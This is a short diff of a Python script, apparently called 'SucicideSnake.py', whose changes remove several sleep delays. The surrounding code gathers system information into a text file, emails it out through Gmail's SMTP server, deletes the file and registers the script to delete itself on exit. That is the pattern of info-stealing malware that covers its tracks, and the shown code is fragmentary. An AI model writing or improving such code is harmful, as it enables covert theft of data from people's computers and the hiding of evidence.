@@ -37,7 +37,6 @@ print("Grabbed system info...")
 #Create info.txt to contain info var gathered before
 with open("info.txt", "w") as f:
     f.write(info)
-time.sleep(3)
 print("Created info.txt and appended previously grabbed info...")
 
 #Creating attachment
@@ -54,10 +53,8 @@ with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
 print("Successfully sent email...")
 
 #Deleting info.txt
-time.sleep(2)
 os.remove("info.txt")
 print("Deleted txt file...")
 
-time.sleep(5)
 #Deletes current script (SucicideSnake.py) after execution
 atexit.register(lambda file = __file__: os.remove(file))
